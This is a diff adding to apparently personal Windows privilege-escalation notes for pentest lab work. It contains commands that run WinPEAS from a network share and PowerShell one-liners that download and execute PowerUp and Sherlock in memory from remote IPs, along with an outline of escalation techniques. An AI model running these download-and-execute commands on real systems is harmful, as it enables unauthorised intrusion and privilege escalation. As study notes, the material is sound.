@@ -67,6 +67,34 @@ winbin/ #a copy of windows binaries in /usr/share/windows-binaries/
     chisel.exe
 ```
 
+I used the following commands to launch the tools quickly without having to transfer them first on the target itself.  
+```
+#WinPEAS - I love this tool
+//192.168.194.141/share/winPEASx64.exe searchall cmd
+#PowerUp
+powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.11.0.73:1234/PowerUp.ps1'); Invoke-AllChecks"
+#Sherlock
+powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.194.141:1234/Sherlock.ps1'); Find-AllVulns"
+```
 
+# Kernel
 
-
+# Services
+## BinPath
+## Unquoted Service Path
+## Registry
+## Executable File
+## DLL Hijacking
+# Password mining
+## Passwords stored by user
+## Registry
+## Configuration Files
+# Registry
+## Auto>Run
+## AllwaysInstallElevated
+# Scheduled Tasks
+# Hot Potato
+## Detect
+## Exploit
+# Startup Aplications
+# Firewalled Services
